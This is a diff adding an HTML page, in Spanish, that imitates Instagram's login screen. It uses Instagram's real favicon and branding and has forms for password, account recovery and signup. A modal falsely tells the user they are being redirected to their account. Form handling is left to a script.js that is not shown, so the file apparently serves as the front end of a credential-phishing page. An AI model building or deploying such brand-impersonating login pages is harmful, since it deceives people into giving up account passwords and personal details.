@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+</head>
+<body>
+    <div class="container">
+        <!-- Panel de inicio de sesión principal -->
+        <div class="login-box" id="loginPanel">
+            <div class="logo">
+                <span style="color: #E4405F;">Instagram</span>
+            </div>
+            
+            <h2>Inicia sesión</h2>
+            <p class="subtitle">Para conectar con tus amigos</p>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="email" id="email" name="email" required autocomplete="off">
+                    <label for="email">Teléfono, usuario o correo electrónico</label>
+                </div>
+                
+                <div class="input-group hidden" id="passwordGroup">
+                    <input type="password" id="password" name="password" required autocomplete="off">
+                    <label for="password">Contraseña</label>
+                </div>
+                
+                <div class="links">
+                    <a href="#" class="forgot-link" id="forgotEmailLink">¿Has olvidado la contraseña?</a>
+                </div>
+                
+                <div class="info-box hidden" id="securityInfo">
+                    <p>Al iniciar sesión, aceptas nuestras <a href="#">Condiciones</a>, la <a href="#">Política de privacidad</a> y la <a href="#">Política de cookies</a>.</p>
+                </div>
+                
+                <div class="buttons">
+                    <a href="#" class="create-account" id="createAccountLink">Crear cuenta nueva</a>
+                    <button type="button" id="nextBtn" class="btn btn-primary">Siguiente</button>
+                    <button type="submit" id="submitBtn" class="btn btn-primary hidden">Iniciar sesión</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Panel de recuperación de email -->
+        <div class="login-box hidden" id="forgotEmailPanel">
+            <div class="logo">
+                <span style="color: #E4405F;">Instagram</span>
+            </div>
+            
+            <h2>¿Problemas para iniciar sesión?</h2>
+            <p class="subtitle">Introduce tu correo electrónico, teléfono o nombre de usuario y te enviaremos un enlace para que recuperes el acceso a tu cuenta.</p>
+            
+            <form id="forgotEmailForm">
+                <div class="input-group">
+                    <input type="text" id="recoveryInfo" name="recoveryInfo" required autocomplete="off">
+                    <label for="recoveryInfo">Correo electrónico, teléfono o usuario</label>
+                </div>
+                
+                <div class="info-box">
+                    <p>Al solicitar un enlace, aceptas nuestras <a href="#">Condiciones</a>, la <a href="#">Política de privacidad</a> y la <a href="#">Política de cookies</a>.</p>
+                </div>
+                
+                <div class="buttons">
+                    <button type="button" id="backToLoginFromForgot" class="btn btn-secondary">Volver al inicio de sesión</button>
+                    <button type="submit" class="btn btn-primary">Enviar enlace de acceso</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Panel de creación de cuenta -->
+        <div class="login-box hidden" id="createAccountPanel">
+            <div class="logo">
+                <span style="color: #E4405F;">Instagram</span>
+            </div>
+            
+            <h2>Regístrate en Instagram</h2>
+            <p class="subtitle">Regístrate para ver fotos y vídeos de tus amigos.</p>
+            
+            <form id="createAccountForm">
+                <div class="input-group">
+                    <input type="text" id="firstName" name="firstName" required autocomplete="off">
+                    <label for="firstName">Nombre completo</label>
+                </div>
+                
+                <div class="input-group">
+                    <input type="text" id="lastName" name="lastName" required autocomplete="off">
+                    <label for="lastName">Nombre de usuario</label>
+                </div>
+                
+                <div class="input-group">
+                    <input type="email" id="newEmail" name="newEmail" required autocomplete="off">
+                    <label for="newEmail">Correo electrónico</label>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="newPassword" name="newPassword" required autocomplete="off">
+                    <label for="newPassword">Contraseña</label>
+                </div>
+                
+                <div class="info-box">
+                    <p>Es posible que los usuarios de nuestro servicio hayan subido tu información de contacto en Instagram. <a href="#">Más información</a>.</p>
+                    <p>Al registrarte, aceptas nuestras <a href="#">Condiciones</a>, la <a href="#">Política de privacidad</a> y la <a href="#">Política de cookies</a>.</p>
+                </div>
+                
+                <div class="buttons">
+                    <button type="button" id="backToLoginFromCreate" class="btn btn-secondary">Volver al inicio de sesión</button>
+                    <button type="submit" class="btn btn-primary">Registrarse</button>
+                </div>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <select id="language">
+                <option>Español (España)</option>
+                <option>English (United States)</option>
+            </select>
+            <div class="footer-links">
+                <a href="#">Meta</a>
+                <a href="#">Información</a>
+                <a href="#">Blog</a>
+                <a href="#">Empleo</a>
+                <a href="#">Ayuda</a>
+                <a href="#">API</a>
+                <a href="#">Privacidad</a>
+                <a href="#">Condiciones</a>
+                <a href="#">Ubicaciones</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Threads</a>
+                <a href="#">Subir contactos y no usuarios</a>
+                <a href="#">Verificación</a>
+                <a href="#">Meta Verified</a>
+            </div>
+        </div>
+    </div>
+
+    <div id="successModal" class="modal hidden">
+        <div class="modal-content">
+            <h3>Iniciando sesión</h3>
+            <p>Te estamos redirigiendo a tu cuenta...</p>
+            <div class="loading-bar"></div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
